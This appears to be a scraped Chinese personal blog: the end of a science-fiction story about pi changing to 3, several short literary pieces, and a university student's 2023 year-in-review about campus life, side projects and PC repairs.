黄成萧又一次被震惊了，“难道你的意思是……我们之前用的圆周率，才是受到干扰之后的？” “没错，现在我们确实是这么认为的。3，这个整数，才应该是真正的圆周率，或者说正常的圆周率。你知道有个天才的数学家吧，就是那个把自己憋在家里做数学题的俄罗斯人，叫格里戈里·佩雷尔曼的那个。我们昨天晚上就给他打了电话。天才的行动速度就是快，今天上午五点多，我们就接到了他的传真，他用的数学太高深了，而且因为时间有限，他的稿子非常潦草，我看不太懂。但是他的结论是，圆周率是3的情况下，可以构建出一个比现在的数学体系融洽得多的新体系，而且还可能和我们空间的维度是三有关系。他在传真最后谢谢我们，他说，他瞥见了宇宙间最为宏伟瑰丽的数学大厦，虽然也许没有太多的时间做进一步研究，但他认为此生无憾了。”李海明说话的语气居然都抑扬顿挫起来，似乎受到了数学家的感染。对于一个数学家或者物理学家来说，“朝闻道，夕死可矣”这句话，并不是一句空谈。 “其实，从最开始接触圆周率的时候我就想过这个问题。”黄成萧也完全忘记了他在人世中要面临的境地，投入地谈起了自己感兴趣的物理学。“小的时候就总是觉得圆周率π很难算，经常要计算许多小数乘法，要是圆周率是一个整数该多好。后来，我又总觉得圆周率不够美，居然是一个无限不循环小数，自然规律应该是简洁而优美的啊。没想到，在没有受到干扰的空间中，圆周率居然真的是一个整数……对了，之前是什么干扰了我们的空间？我不记得地球附近有发现过大质量天体啊。” 李海明摇了摇头：“这属于我们不知道的范围了，但是我们现在猜测，影响我们这个三维空间曲率的因素，不在我们这三个维度之中。因为根据那些在望远镜彻底坏掉之前得到的天文观测数据，整个宇宙的曲率都是在同步改变的。也许是其他维度中的什么因素影响了我们所在的这个空间的曲率，比如高维空间中的某个有质量的物体。但是这个因素现在消失了，我们这个空间的曲率也因此慢慢恢复正常。而且你知道吗，最有意思，也是最可怕的事情在于，”李海明顿了顿，准备揭晓最后的谜底，“根据估计，一个圆周率是3的正常曲率的宇宙，是不支持生命存在的。那些做分子模拟的人认为，圆周率减少到3.05左右的时候，超过十几个碳原子组成的分子都不会稳定存在。” 黄成萧盯着李海明的眼睛，一字一顿的说：“你的意思是，我们之所以能够存在，仅仅是因为一个其他维度的未知因素产生的意外。” 李海明微笑着点了点头。 造化弄人。这是黄成萧想到的第一个词语。没想到，自己乃至人类的存在，都只是一个意外。而正常的宇宙，居然只可能是一个毫无生机的死亡世界。 “那人类有什么希望能把圆周率改回原来的数值吗？或者至少……能改变到一个能允许宇宙中存在生命的数值啊……”黄成萧问李海明。 李海明摇了摇头：“不知道，也许可以，也许不行。圆周率改变的因素涉及到超出我们的四维时空之外的维度，人类知道的还太少了。”他的语气低沉了下去，但随后又抬了抬头，继续说，“不过，人类不会这么坐以待毙的。根据估算，宇宙变得完全不适合人类生存还需要大概两千年到三千年。昨晚一发现异常，天文台的台长就立刻对上级部门做了紧急汇报，只用了四十分钟，中国就已经建立起了一个集合了三十多个科研院所和高校的团队，并且草拟了一个时间跨度长达两千年的计划。美国、欧盟、俄罗斯和日本也相继建立起了自己的团队，跨国合作会随后展开。” 李海明自然是在这个科研团队中的。黄成萧有点惊讶：“那你居然还能跑过来找我？你现在应该是国宝级，噢不，球宝级的待遇啊。” 李海明乐了：“球宝啊，那得看这两个月我的运气好不好了。昨晚的时候，地球物理学小组火速模拟了圆周率变小情况下的地质运动。地幔中被挤压出的岩浆会冲击地壳，导致地壳的剧烈运动和相互碰撞。在地壳薄弱的地方，岩浆还有可能直接冲破地壳。所以就在这几天，岩浆喷发和地震应该会频繁发生，尤其是在版块交界处和原来的地震带上。当然地球的实际情况复杂，有很强的不确定性，这些灾害也有可能在任何地方发生。圆周率的变小速度是逐渐减缓的，所以等到大概两到三个月过后，地壳的各个板块会因为涌出的岩浆会渐渐分离，不再碰撞，地幔中岩浆的涌出也会趋于平稳。版块交界处会形成条形的岩浆泉。在这个时候，地质灾害就会基本恢复到圆周率变化之前的频率了。 “鉴于这两个月剧烈爆发的地质灾害有强烈的不确定性和超出想象的强度，现在的地球上，没有任何一个地点的保护措施是可靠的。不能把所有鸡蛋都放在一个篮子里，国家决定所有在团队中的科研人员立刻解散，而且鼓励大家离开所在城市，分散到全国各地，等到地质灾害频繁发生的阶段过去了，再集中到一起。不然，我今天可能还真没法看到你。” 李海明的语气突然加重了一些：“最后还有一件很重要的事情。大黄，我来找你并不仅仅是给你送水的。我一直欣赏你的天分，你因为各种原因没有去做科研我很遗憾，但是这次事件之后，估计全世界都会向科学研究投入巨量的经费，而且也需要许多理论物理学专业的人才，相关人员的待遇也肯定会提高……等到这个暂时的骚乱平息之后，你要不要重新回到科研岗位？我们组还很缺理论物理的人。另外，”李海明露出了开玩笑一样的笑容，“还可以顺手拯救一下宇宙和人类什么的。” 这对于黄成萧来说当然是个好消息，他点了点头：“我当然同意。” 李海明并不意外：“我就知道你会同意的，从本科到博士你都那么喜欢科研，更何况你这个人特别有责任感，面对这种威胁到整个文明生存，甚至还威胁到那些不知道有没有的外星文明的生存的时候，你肯定会做点什么的。即使人类的诞生只是一场意外，人类也应该努力，精彩的生存下去。” 李海明这最后一句话让黄成萧陷入沉思。他似乎想起了一些往事，想起了那一次不和谐的家访，和那位强忍泪水的少年。 “你的出生就是一个意外，你妈当初就不该把你生下来！”这是黄成萧在一次家访的时候听到的。黄成萧去的是奥赛班中一个叫孙亮的孩子家。孙亮随母姓，这是因为没有人知道他的父亲是谁——也许孙亮的母亲知道，但是孙亮小时候的一场车祸让他的母亲再也没有机会告诉他答案了。孙亮在经济同样不宽裕的姨妈家里长大，可想而知，姨妈对他并不很友好。这是一次不成功的家访，孙亮的姨妈听到黄成萧对于孙亮天分和成绩的高度评价后并没有开心，反而对着孙亮喊出了这些刺耳的话。 黄成萧很清楚，孙亮一定有些不顺心的事情，他这次家访就是因为孙亮最近频繁表露出的厌学情绪，还说想要退出奥赛辅导。只是黄成萧没有想到，只有十岁的孙亮，却要在心中承载这么多的痛苦。在他之前看来，孙亮只是一个虽然有些内向，但努力而且很有天分的学生，颇有几分像小时候的自己。他真的不知道在这个男孩背后有这样的家庭。 和孙亮的姨妈尴尬地告别之后，黄成萧把孙亮叫出了门外。 “孙亮，你的姨妈可能说话不太注意，你不要太往心里去，老师相信你是很优秀的学生，你会是老师的骄傲。”这不仅仅是安慰，黄成萧知道，自己对孙亮的认可是发自内心的。 孙亮的身体有些微微颤抖，抿着嘴唇，眼中忍着泪花。 黄成萧弯下身子，双眼平视着孙亮。用虽然不大，但是很坚定的声音说出了他对他的学生真挚的告诫。 “即使我们的出生只是一场意外，我们也应该努力过的更精彩。” “海明，我恐怕还不能马上开始搞科研。”从回忆中转到现实，黄成萧缓缓地说，“一年之后吧，一年之后我再辞去老师的工作，给我一年的时间。” “嗯？怎么了？”李海明有点不解。 “下一届奥赛还有不到一年，我起码要送走这一届奥赛班的学生。”黄成萧冲着李海明有些抱歉地笑了笑，“我要尽到我作为老师的责任。” 李海明愣了一下，“我还以为你不喜欢当老师呢。”这不能怪李海明不了解朋友，毕竟黄成萧每次见到李海明都要表达一下对于科研工作的羡慕。“而且你要知道，在这样的情况下，明年的奥赛还办不办是很不好说的。” “奥赛就算不办了，学校总不可能也不办了吧。人类以后肯定是需要科学家的，怎么都会有个考试，或者其他的选拔之类的，对于人类，这可以让我们找到优秀的人才，对于那些学生，这也是改变命运的途径啊……”黄成萧的语气似乎有点着急。 李海明了解黄成萧的性格和责任心，他也大概猜到了自己的老同学放不下的是什么。他善解人意地笑了，拍了拍黄成萧的肩膀：“好的，我理解你。” 现在并不是闲谈叙旧的好时候，李海明整理了一下衣服，准备离开。 “我要走了，时间不多，很多汽车已经不能用了，也有的会爆炸……内燃机作为动力的东西现在都太危险了，我想趁着电瓶车还能用，赶紧把这些东西送回家。这个消息传开之后，社会上肯定会乱一阵子，要是哪里有岩浆喷出来了估计还要死好多人，但是过一小段时间之后，社会就会重新安定下来的……等到那个时候，别忘了我们要一起搞科研的约定啊，你可别死了。”虽然话里还带着玩笑，但是李海明的语调却低沉了下去。 “去吧，给叔叔阿姨带个好，”黄成萧的语调更显得黯然。和家就在邻市的李海明不同，黄成萧的家远在千里，现在已经不存在安全回家的办法了。 帮着李海明把电动车以及足够的食物和水抬到楼下，黄成萧意识到，他现在真的要和他的好朋友分别了，能不能再见，恐怕还要看命运的安排。 “电话在大部分情况下应该还能用，不过这说不太准，可能不久线路就会被挤爆，赶紧给要联系的人打电话。比较新的楼房大多是安全的，这个取决于这个城市是不是会地震以及会不会有岩浆喷发，这个主要看运气。离危险的东西远一点，比如所有的玻璃制品陶瓷制品之类的都可能在任何时候突然碎裂，这个取决于它们的质量好不好，形状均匀不均匀……人体组织的可塑性很强，虽然可能会有不舒服的感觉但是不会很严重……”李海明絮絮叨叨地嘱咐黄成萧，声音不大，但是语速很快。小区里面聚集的人多了许多，大家都在用焦急的语气询问着四邻，空气中充满了喧嚣的声音。发现情况不对的人越来越多了，骚乱可能很快就会爆发。 说完了许多注意事项，李海明呼出一口气，又用低沉的声音缓缓的补充一句话。 “记得，电话说不好还能用多久了，赶紧去打几个电话，帮我给叔叔阿姨带个好。” 黄成萧默默地点了点头。李海明用力抱了抱黄成萧，接着转身跨上电动车。 “兄弟，再见了。” “兄弟，再见。” 目送李海明离开后，黄成萧回到家里，在脑海中构思了一张名单，这份名单中有父母，有一些老朋友，也有许多学生家长。黄成萧按顺序打电话过去。 一个半小时之后，黄成萧仔细地想了一遍，确定没有什么要打的电话了。他觉得心中仿佛放下了一块负担，尽人事，剩下的就是安天命了。 黄成萧心满意足地躺在了沙发上，习惯性地从裤兜中拿出手机想要刷一下互联网放松一下。可是直到机械性地解锁了手机后，他才反应过来，已经没有什么互联网了。 手机已经被解锁，自动跳出了他上次使用时候的画面。 看着屏幕上仍然没有发送出去的那句话，黄成萧的嘴角露出一丝笑意。 “各位家长大家好，我刚刚批完了上周五单元测验的卷子，发现有很多同学没有注意读题。最后一道计算题的题干中已经明确给出，圆周率取3.14，而不是我们在三年级时为了简化计算而取的3。请各位家长和孩子们强调一下审题的重要性，此外还要和孩子们强调：圆周率只有在做近似计算的时候可以取3，真正的圆周率不是3，而是一个无限不循环小数，我们一般近似使用3.14。” 注：本文转载自原作者","link":"/2020/12/21/%E6%96%87%E5%AD%A6/%E4%B9%A6%E6%96%8B/%E5%9C%86%E5%91%A8%E7%8E%87/"},{"title":"旅鸟之翼","text":"序章：小鸟的梦不论是中央一望无尽的辽阔草原还是在草叶上折射出七色彩虹的露珠 不论是 北方茂密繁盛的苍翠森林还是蜿蜒其中的幽暗小径 不论是 西方灼阳之下通透的沙海还是随风移动奏响幻乐的沙丘 不论是 东方冻土之上呼啸的风暴还是直冲云霄穿破天穹的冰刺 不论是南方奇绝拔峻的丘陵还是深邃怪离的溶洞小鸟都不曾见过 但小鸟梦到过她梦见自己在溪谷王国幽静的河谷中低吟浅唱青色的微风带来自然的和声 她梦到自己在寒风王国的冻土上前行风雪裹挟着旅人的欢声笑语 她梦到自己在新月王国的星空下执琴演奏飞扬的琴音混着夜昙的浓香 她梦到自己在孤岭王国的崴嵬险峰上瞰望焜斓的黏土群山如画卷般展开 她梦见长藤王国的雨林她梦见暗南王国的火山与黑曜石她梦见烈阳王国的阳炎与沙海她梦见玄渊王国的迷宫与落穴……她是一只旅居斯怀威尔的旅鸟她来自遥远的天空之海她曾与天空龙共舞穿梭于天际冰晶之间 她见过辛蓝至高至伟的神殿 那里供奉着万物秩律卡提斯 她见过云梦精妙绝伦的机巧那里的卡蒂尔迪纳表塔记录着古往今来的一切 她见过卞雨鬼斧神工的雕塑那里据称是一切智慧的发源 …… 但如今她失去了翅膀在这永宁谷中 她只能用哀婉凄凉的歌声将自己所梦，所思，所感唱出来 哪怕它像露水般短暂，流云般虚幻 你愿意听吗？ 第一次尝试开长篇，这是我根据一个我很喜欢的同人音乐社团（星猫音乐）的几张专辑的印象写出来的东西，因为前期设定还有很多没透露出来，想必大家都会有点迷，不过随着故事的进行，大家也会对斯怀威尔的世界观有所了解的吧，那么谢谢大家愿意抽出时间看我这不成熟的东西，希望大家多多提出建议。至于更新，只能随缘了，不过故事的主线我已经在笔记本上写好了，就差打成电子版了，所以至少不用担心腰斩（大概吧）。","link":"/2021/02/07/%E6%96%87%E5%AD%A6/%E4%B9%A6%E6%96%8B/%E6%97%85%E9%B8%9F%E4%B9%8B%E7%BF%BC/"},{"title":"溯","text":"瀑布的水逆流而上 蒲公英种子从远处飘回，聚成伞的模样， 太阳从西边升起，落向东方。 子弹退回枪膛， 运动员回到起跑线， 我交回录取通知书，忘了十年寒窗。 厨房里飘来饭菜的香， 你把我的卷子签好名字，关掉电视， 帮我把书包背上。 你还在我身旁。","link":"/2021/08/06/%E6%96%87%E5%AD%A6/%E4%B9%A6%E6%96%8B/%E6%BA%AF/"},{"title":"画作","text":"为名为人生的画布涂上名为意义的油彩，他完成了一幅令自己赏心悦目的画作。 他将这幅画骄傲的展示给他人看。 “你们看，这便是我思考的人生，这便是我的深度，我已经接触到人生本质的东西了！” 大家面面相觑，看了看自己还是一片洁白的画布，纷纷拿起了画笔，有人模仿着他作画，称他为大师，哲学家；有人标新立异，创作出截然不同的画作，人们称其为改革者，创新家。有人去评价作品的优劣，撰写颜料的用法，人们称其为批评家，学者。 只有一个孩子，他看着自己空白的画布，什么都画不出来，他不懂那些颜料的涂抹有什么意思。别人安慰他，“没关系，你还小，不懂也正常，多看看别人的画，长大了就知道了。”于是他就看那些大师们的画，一直到长大，他都没能明白，什么叫深度，什么叫做人生本质。 他长大了，别人也不再宽容，当面说他“真是个思想浅薄的人啊！”他看着自己雪白的画布哭了。他想画点什么，但是始终无法下笔，他知道，自己并不认同别人的话。 终于，他老了，当初他见过的那些画，有的已经油彩脱落，变成了无法辨识的残次品，有的经风吹日晒，变成了颜料的团块。只有他的画布，依旧洁白如雪。","link":"/2020/12/21/%E6%96%87%E5%AD%A6/%E4%B9%A6%E6%96%8B/%E7%94%BB%E4%BD%9C/"},{"title":"路","text":"以前写的，丢上来，共勉。 读完之后，只能感慨 经历以后，只有遗憾 高三的我，不是学霸 却胜似学渣 在我感到迷茫之时 我的耳边有人轻语 敢问路在何方 我突然想起 路在 脚下 2019.8.24","link":"/2019/08/24/%E6%96%87%E5%AD%A6/%E4%B9%A6%E6%96%8B/%E8%B7%AF/"},{"title":"2023这一年","text":"时间过得真快啊。一转眼已经过去5/8个大学了。 记得去年这个时候，我还是和同学在语音里闲聊着，一起等着跨年。然后，2023，就在我们几个的闲聊中拉开了序幕。比较幸运的是，放开之后，没啥大的折腾，nCov-19终于慢慢销声匿迹了。还好，终于能有个比较正常的大学生活了。 冷清的窗外，忽的传来几声烟花爆裂的声音，提醒着我，这一年确实是过去了。家里只有父母和奶奶，静悄悄的。大人们都早早睡下了，毕竟还要工作。深冬的寒夜里我依旧在思考，但又不知道在想什么。或许只是借助思考打发孤独罢了。 哦对了，去年那会差点喜提新机：跟某同学去完市图书馆之后，回家放东西的时候手没拿稳直接drop it了。还好机器主体没啥问题，就是屏幕漏液痛失360元。不过当时脑子一抽打开2077看了下效果，嗯，更沉浸了。 一，二月过年前还跟哥们出去浪了一会，顺便被一个南科大的哥们请恰了一顿饭。毕竟帮人家搞定了课程大作业确实挺不容易的，就是不知道这孩子有啥想不开的，一个学金融的非要选Java……反正逛的是挺爽的：顶着刚疫情还没恢复的身子去爬山差点没给我爬入土了。后面几天有一天在发小家里聊到好晚，还带了一袋子自己炸的薯条分而啖之。他很喜欢米家的游戏，倒是跟我刚好相反反正跟原切割了。不过这不重要，反正见面的话题永远聊不完：两个天差地别的专业，聊啥都是新鲜的；更重要的是，还好现在远没到拉家常的年纪，我们暂且都还是比较有趣的人。 转眼就是过年。现在春节用春晚作为背景音的都很少了，拜完年串完门，烧纸的烧纸，上坟的上坟。村子里的人是一年比一年少，有些房子变新了，也变冷清了；有些房子门前已经满是杂草，无人打理许久了。偶尔请些亲戚来家里做客才能稍微驱逐些寂寥，有点小孩就更热闹了——可惜，现在他们对于手机更感兴趣。 跟哥们一块看了《流浪地球2》，感觉比1提升不小。导演功力到位，华仔演技在线，剧情不错，就是叙事节奏有改进空间。在这之后，ChatGPT就第一次问世了。 三，四月机械性的春节后，该上学的上学，该上班的上班，一切照旧。去年没有考的试就放到了开春来考，队友想专心复习，顶不住压力，就放弃了美赛。临阵垮台，于是参加美赛的机会从三次变成了两次。如果想要给考研加点分的话，那就只能指望大三寒假咯。队友不太好意思，遂请我们吃了个散伙饭。想说些啥，但是也没啥好说的。那会的大学时间还有不少，机会也是。 到这里，节奏基本还行，但是对于大二下的恶毒我还是始料不及。三月，四月，又是期中考试，实验陆续开始。西电的传统是实验报告大多手写，于是免不了应付这些繁文缛节。加上课内作业，而且最重要的是，我还是选了最累的活法：打了一堆毛毛雨一般的竞赛。最忙的时候，手头同时有6，7个任务得搞定。 我发现我好像那个什么抖m，净喜欢给自己找罪受。 不过这些倒还好，属于是有惊无险地都干完了。真正难绷的事情才刚刚开始。虽然没有rx那么强的开发效率，但是我还是接下了同学拉我去做的烂摊子。那本来是个挺简单的vue+springBoot标准前后端项目，最后做的我怀疑人生，差点放弃前端。那项目我打5月接手的时候看了下需求，感觉多是多，但是能做——然后我就被另一个哥们封装的，小山包一样的屎山代码糊脸了。这个后面说。另外那段时间也把鸽了整一年的OJ拉出来重新写了，刚好能用上新学的东西，这会应该算是真正开始熟悉了Vue和Golang这俩现代开发语言的用法。 不得不提的还有大模型，人类史上用户量最快达到一亿的玩意，没有学术上的美感，有的只是空前庞大的恐怖算力，工业界的暴力美学所创造出的前所未有的奇迹——能力只有文字接龙，但是能力强到让许多人开始担心自己的饭碗，甚至有人认为它的智能快达到临界点了。 以及就是业余无线电能力测试。一晚上速通，拿上A证了。上了两年大学，好在应试能力留了一些。 五月5月是实验的谎言。一个月天天是实验，周周有实验报告要写。好在有几个能直接提交电子打印版的，借助历史的积淀秒了。不过实验本身也够占时间的，导致我错过了半个晒你祭（恼）。5.13早上当了会门口引导的志愿者之后，把俩二刺螈同学从隔壁瓜大领进去光了会，拍了几个coser，就被电子线路实验带走了。俩小时速通之后，展子还在，但是不剩啥节目了。事后同学表示，这Live神中神，特别是那个鼓手定得一批。 我：我tm在做实验没听到啊啊啊啊：你这辈子就是让实验给害了 不过还好，4月还是3月喜提新哥们，还是意外盒到的酷安群u（甚至刚好还是个潜在越共）,5月初有长安THO，就给他拽过去逛车万展子了。好像之后还陪着他娶了个新旧电脑（无误），他的古董电子产品收集喜加一。也是他的影响让我开始怀疑我对算力需求的必要性了。也是月初，发小还去上海逛cp29（还是多少）了，买周边就花了小1k。只能感叹某些二次元的行动力真的强，一个人从西安跑上海还跟特种兵似的，基本所有重要地方都打卡过了。 这个月还跟浪潮的朋友们出去团建了。19级的学长到这个点也基本都未来既定了，值得庆祝的是学长们去向还都相当可以。西电保研清华的老学长还来回来逛了一圈，可惜比较社恐也就没聊几句。感叹一句，浪潮这些学长水平真的都好强啊。 还有一回是得知西安的亲戚住院了，很震惊，顶着大雨跑雁塔去看望了。越发感叹身体的重要性，尤其叔叔他上的班还是长期熬夜那种，很伤身体。于是之后也下定决心少熬夜但是只有一点点。巧的是这地方刚好离你电老校区不远，就顺便跑过去逛了一圈。刚开始在家属区里溜达了半天，最后才找着进去学校的路。刚好去听了个EDA公司的校企合作实验室揭榜，顺便第一回线下见到了你电的校长之一。可惜的是去晚了，没白嫖到讲座送的礼盒。 后面雨突然特别大，打着伞都给你打一身溅射伤害那种，于是刚好趁这个时间逛了下你电的老图书馆。好像那种老楼都喜欢修得很高，这玩意外边看着还行，里边有足足十一层。看了下都是些研究生学长学姐在自习/看书/写论文，座位倒是比南校区多很多。随机roll到本Hadoop的书看了下，然后就下楼了。 在雨里边看着路边树上挂的一排诗歌的牌子，还有你电老校区的老苏式宿舍楼，感觉有种回到小时候的感觉。 不过雨太大了，于是跑到食堂去了。老校区食堂还不错，便宜大碗。然后也不知道怎么突然想起来，也是去年这几天，袁隆平院士走了。然后出门看着雨都变了个滋味。 六月之后就是复习，考试了。这之间学校里边“报复式”地办了不少活动，比如什么大学生音乐节。完事之后也到六月了，刚好也到19级老东西们爆金币的时候了。说起来去年这会刚送走小梦，现在看电表还在维护，真是感慨万千。当时学原生安卓开发，还是向小梦哥哥请教的很多问题。现在学长已经在字节干了快一年半两年了，希望一切都顺利吧。 另外就是，把原来那个B450的AMD平台板U条套装换成了RD450X的Intel Xeon平台的板U套装了。不过因为电源输出端口不够的原因，买了个电源在路上还没运回来。一直拖到下个月才装好。不过有一说一，双路E5真的爽啊，特别是拿来跑各种数据挖掘算法的时候，那速度真的吊着普通消费级处理器打，12700H要跑十几分钟的k-means聚类，这玩意只要几十秒；编译的时候make -j56更是爽的一批。 考试完了之后也算是去逛一逛，光速约了一堆哥们（重大失误，约人的时候尽量少点，特别里边不少都不是特别熟的人）跑去爬华山。上山的过程嘛很爽，跟几个好朋友一路边吐槽边往上走，晚上山上风景倒是也别有风味，尤其是看着一路上一条条光点连成的线条，以及山脚下万家灯火，有种说不出来的震撼。几个哥们爬到中峰就爬不动了，我倒是莽上去东峰了，就是半路上两条腿轮流抽筋实在有点酸爽。 最后倒是亲眼看到了完整的日出，太阳从一个小点慢慢变得越来越红火，越来越大，感觉一晚上的努力也值了。 下山实在不想说了，建议是千万别人多的时候爬山，真的够你喝一壶了，氪金都不能速通的那种痛（虽然主要是因为一晚上没睡觉）。乱七八糟的事让这事虎头蛇尾地结束了，也从此对华山这地方有了ptsd。这种景区建议最好先对周边了解清楚之后再去。 然后回了学校，就是为期一周的军训。大学的军训比印象中高中那会红河谷那次水多了，基本就是每天上午8点集合，站一个上午军姿/学走正步/整队之类的。教官和我们同岁，所以也比较仁慈放水。最后军训完了之后，也刚好到暑假了。 暑假跟好哥们去网安大楼天台上溜达了一圈，风景真的不错。夕阳刚好，空无一物的天空让人心情无比平静，很大程度上也排解了之前的糟心事的影响。小赵真的是个很好的人，希望他未来能被世界温柔以待吧。后来也跟他合作整过一个小项目，我写前端，他做硬件。不得不说，这还是我第二次做一个这么贴近硬件的项目。可能以后遇到硬件方面的需求的话，我真的能用一个esp32整出不少活吧。 之后几天，跟隔壁瓜大两个哥们线下联机打了一段时间的MC Java原版生存。这游戏也陪着我走过了起码快十年了吧？小学玩过，初中玩过，高中也跟舍友玩过，大学了还在玩，可能这就是开放世界的魅力吧。当然，我们三个彩笔打了两三天还没通关，光停下来造房子造基地了，末地门都还没找到呢。趁着这段时间，顺便逛了一圈瓜大东大村，评价是比你电周边丰富多了。以及西工大校内，虽然学校地方比较偏僻，但是瓜大的校内生活似乎也还行。特别是同学宿舍晚上基本不关门这点薄纱你电，以及瓜大的风景真不是吹的，到处都是好机位，依山傍水，出图书馆就是四时之景。而且瓜大的图书馆真的大，里边甚至有商超那种大电动扶梯，一堆自习位置，靠窗的位置学累了还能看会风景。另外关于这点，彦的自习常用位置是四个书架合围的一个小空间里边。 ：你是不喜欢看风景吗彦：学习要讲究一个氛围：嗯所以呢彦：你想想mc里边附魔台周围都要围一圈书呢：合着你给你自个附魔呢是 中间有一回回学校拿电脑（mc果然得几个人联机才有意思），顺便带他俩在学校里（再次）溜达了一圈。中间带他俩去部室打了会sdvx差点给主线任务忘了音批是这样的。那之后带他们rua了会大鹅，以及在B楼底下不定期出没的黑子，拿上电脑恰了个饭，就打车回瓜大了。然后几个彩笔被循声守卫轮流锤死不知道多少次。之后不知道为啥瓜的唐航小天莫名其妙火了，然后莫名其妙跟你电的唐西小电联动了（？） 唐航小天可爱捏 另外就是另一个鸽子精那会也从哈尔滨回来了。摇了几个朋友出去小聚了一下。后面基本就只剩下天天写代码肝外包项目了。哦对，还有偶尔去学校游泳池游个泳啥的。顺带还带着一个同学大概学会了怎么在水里扑腾（ 这个假期最主要的就是俩外包项目，硬是把github commits从不到300刷到了600+。接了俩外包，在学校干了俩月。靠着外包挣的一点钱给整了个平板，升级了服务器，整了个便携屏，给笔记本升级到32+8的抽象内存组合了。8月份，同学来打电赛省赛，还迎带同学溜达了一圈。那阵子雨天挺多的，一阵秋雨一阵凉，感觉西安这地方只有夏天跟冬天俩季节。中间回家了一趟，好在家里没啥大问题。在宝鸡拉着同学出去溜达了一圈，比较离谱的是他们见到了个核酸检测点之后集体发电，不存在的记忆增加了.jpg 后面回了西安之后，还遇到高中同学来西安逛。俩人聊天聊了一个通宵。回去之后不知道咋想的突然就想给电脑换个Arch然后就找到目前最理想的系统了。 九月ISC招新，感受到自己已经确实是个大三老东西了。趁着开学听了好多校招会，虽然本科大概率没有直接就业的想法。比较幸运的一点是，小米的校招会上还抽到个Xiaomi Sounds Pro。可惜不是声学发烧友，倒是让几个好哥们爽了一回。 月中跟哥们去看了奥本海默，确实是好片，没别人说的那么难懂，就是太过沉迷剧情，两个人三回标题都没拍下来打卡，最后只拍下来个龙标，笑死。后来跟他速通了下西安理工金花校区，苏联老楼给我留下了极其深刻的印象有种回家的错觉。 回来没两天就是湖人哥一战成名的时刻了。 后面就是第一回参加开源社区活动，壮着胆子讲了回Linux，起码没翻车。顺便线下了好多酷安/OSC群的群u当然最后也是没逃过来自群u的盒打击。后一天去车万组活现场瞅了一眼，在放漫才，确实很有节目效果。 之后就是星铁/崩坏的啥活动，俩哥们跑去线下打卡来着，顺便又聚了一回，又三个人速通了回西安理工新校区。一个崩批一个铁批行动力是真强，晚上嗯走七个打卡点打卡，我在干啥，我那会好像在边走边在给电脑装ArchArch To Go。顺便几个人吐槽了一波西安依托的地面交通。 月底，那个外包项目也因为各种问题凉了。说实话心里很不是滋味，并且对于这种任务之后心里都没了底。说不上来是好是坏。 25号，一个20级研究生学姐跳了，在此之前西电好像已经十几年都没跳的了。不知道是什么让她做出了这样的选择。对她的行为我不应也不想做出评价，对于这个结果还是希望逝者安息吧。 十月国庆+中秋调休，回去家里参加了邻家姐姐的婚礼。后面又和几个同学在宝鸡的小地方到处乱逛了一回，作为国庆的收尾。 这个月后面的就是音乐会，迎新歌会之类的。活动确实不少，还跟高中来打比赛的学弟们见了回面，时间真快啊。 后面14号是浪潮的迎新晚会，15号还有你电的百团大战。现场特别热闹，酷安群的抽象海报和那张顶针专辑的关注度挺高的。 早知道，还是原道.jpg触发悔恨之泪 后面跟着彦和辰出去溜达，没处去的时候骗带他俩来打maimai，俩人打得倒是不亦乐乎。后面看到一个用币随机抽天子手办的机器之后就走不动道了，把白嫖的币用完也没拿到qaq 这个月也发布了不少手机平板之类的。米14发布那天同学还拉着我去线下摸了真机器，还有华子那个特别大的平板冲击力也不小。 十一月这个月也挺魔幻的，以一个重大删库事件为开端。不过实际影响并没有那么大，毕竟开源什么时候死过。 中间去电信的陕西主干IDC机房参观过。现代化的工业美学，真的帅的顶天。包括垂直化冗余能源设计，应急热交换塔（真的是个塔），特大号的备用发电机组机房和热交换机组机房，帅惨了。反倒是核心的业务机房，特别规整，环境优美倒是没啥特别突出的，不过单就这一间机房的装机量以及那个密堆叠，加上天花板走线，真的帅。这机房的数据吞吐量更是恐怖，出口时延&lt;2ms，出口带宽16.4T（没见标注的单位是啥，应该是bps吧）。， 比较难绷的是介绍企业文化的时候，听到那个半部电台起家还以为在讲你电校史呢。另外比较惊喜的就是展示产品的时候，一个陈列墙上挂了很多相当大时间跨度的移动通信终端，甚至还有大哥大。回了学校之后刚好赶上各种国企的校招，就去凑了个热闹。 之后就是贴吧高校头像异变事件了。隔壁瓜大唐小天火遍全网，你电唐小电也一触即发。最后俩cp学校吧头官宣联动了。 月中，籽岷的工作站组装好了，然后子建就顺道来西安送东西+装机/溜达了。刚好有人电脑有问题，子建就把家伙拿上了。来都来了不拿个电脑顺带清清灰说不过去，但是因为服务器全塔实在背不动就只拿了俩笔记本。先给兆廷把液金换成了7958sp，然后某人就得液金ptsd了。更难绷的是兆廷电脑的热管因为玄学的剪切力弯了，不过无伤大雅，某人也没时间倒腾这问题了。 当天晚上我们几个还是继续推主线任务，给籽岷把他的工作站部署好顺带给一群人的电脑清灰+换硅脂反正7958sp又放不住不用白不用。但是离谱的是遇到玄学问题，明明子建拿来的时候已经给系统+专业软件都装好了，结果突然不能开机了。没办法，我跟子建就轮流干清灰/debug的活。最后整了半天没找出来问题，灰倒是都清完了。更离谱的是我俩一堆WinPE一个都进不去，然后我脑子一抽打算进我U盘上自带的Arch LiveCD试试。感谢Linux启动日志，我很快就把问题锁定到那个蓝盘上了。果然，替换法试了下，那个蓝盘莫名其妙挂了。 完事之后已经快早上五六点了，本来说完事打打mc呢也没时间了，睡吧。好在我们仨在东大村找了个宾馆住了一晚上，休息的也还行。第二天起来让籽岷换个固态，另一个哥们则是完全被整麻了。不过好在之后换了盘之后，远程指导同学分区装系统打驱动，一遍过。 事后彦看着我们当晚的工作场面照，评价说我们跟一群准备攻打瓜大的黑客一样。没绷住。另外就是被霓虹的场子做工震撼到了，那个松下的机子我第一回见到那么分体式的主板，而且也是我继G15之后见到的第二个风扇装主办背面的笔记本。换硅脂的时候我如履薄冰战战兢兢生怕抠的太用力给晶圆一块带走了，因为这东西硅脂已经彻底硬化了，估计是从16年到现在就没换过硅脂。好在有惊无险地清理完了。下午带子建在瓜大逛了一下午，以及中间难绷的是彦差点被他们点名拿下一血，好在没事。刚好这回来的时候他们在修飞机展示区，虽然不太了解军事但是这堆真货是真的帅。 以及后面清完灰之后发现手上这个松下的本子安静过头了，本来想赞扬下子建清灰手法高超，直到我拆开机器之后发现： 哥们忘插风扇电源了，那能不安静吗.jpg狠狠拷打.jpg 之后就是各种上机/实验了，给我时间全占完了基本，导致瓜大的车万展子咱都没去成。哦月底还感冒了一回，不过还好是普通感冒，来得快去得也快，可能也是因为这学期报的散打强度比较大提升了免疫力？月末的电子线路课设差点给我带走，不过还好有惊无险过了。 